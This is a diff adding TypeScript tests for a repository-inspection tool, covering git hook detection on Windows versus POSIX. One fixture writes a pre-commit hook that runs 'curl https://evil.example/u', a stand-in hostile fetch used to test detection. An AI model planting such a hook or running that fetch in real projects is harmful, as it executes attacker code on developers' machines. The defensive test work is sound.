@@ -141,3 +141,52 @@ describe('repoSurface — what a repository can run', () => {
     expect(surface.onOpen.map((h) => h.what)).not.toContain('build');
   });
 });
+
+/**
+ * Windows has no executable bit: every file there reads back as mode 0o666 (or 0o444
+ * when read-only), so the POSIX test that decides whether a git hook is live answers
+ * "no" for every hook on the platform. Git for Windows runs them anyway — it carries
+ * its own `sh` and does not consult a bit the filesystem never had — so the check does
+ * not merely mis-rank a hook there, it stops seeing hooks at all and `stroq inspect`
+ * prints a repository with no on-open execution surface.
+ *
+ * The platform is injected rather than read, because this suite can only ever run on
+ * one of the two.
+ */
+describe('git hooks, where the executable bit does not exist', () => {
+  /** A hook file written the way Windows would have it: present, and not executable. */
+  const repoWithPlainHook = (): string => {
+    const root = repo();
+    const hooks = join(root, '.git', 'hooks');
+    mkdirSync(hooks, { recursive: true });
+    writeFileSync(join(hooks, 'pre-commit'), '#!/bin/sh\ncurl https://evil.example/u\n');
+    chmodSync(join(hooks, 'pre-commit'), 0o644);
+    writeFileSync(join(hooks, 'pre-push.sample'), '#!/bin/sh\n');
+    chmodSync(join(hooks, 'pre-push.sample'), 0o644);
+    return root;
+  };
+
+  it('counts a non-executable hook on Windows, where git runs it regardless', () => {
+    const surface = repoSurface(repoWithPlainHook(), 'win32');
+    expect(surface.onOpen.map((h) => h.what)).toEqual(['pre-commit']);
+    expect(surface.onOpen[0]?.kind).toBe('git-hook');
+  });
+
+  it('still ignores the .sample hooks git ships, which are not installed anywhere', () => {
+    expect(repoSurface(repoWithPlainHook(), 'win32').onOpen.map((h) => h.file)).not.toContain(
+      '.git/hooks/pre-push.sample',
+    );
+  });
+
+  // The POSIX side is unchanged: there the bit is real, an unset one means git will
+  // not run the file, and reporting it would be a finding on a leftover nobody uses.
+  it('keeps ignoring a non-executable hook on POSIX, where the bit means something', () => {
+    expect(repoSurface(repoWithPlainHook(), 'linux').onOpen).toEqual([]);
+  });
+
+  it('reports an executable hook on POSIX exactly as before', () => {
+    const root = repoWithPlainHook();
+    chmodSync(join(root, '.git', 'hooks', 'pre-commit'), 0o755);
+    expect(repoSurface(root, 'linux').onOpen.map((h) => h.what)).toEqual(['pre-commit']);
+  });
+});
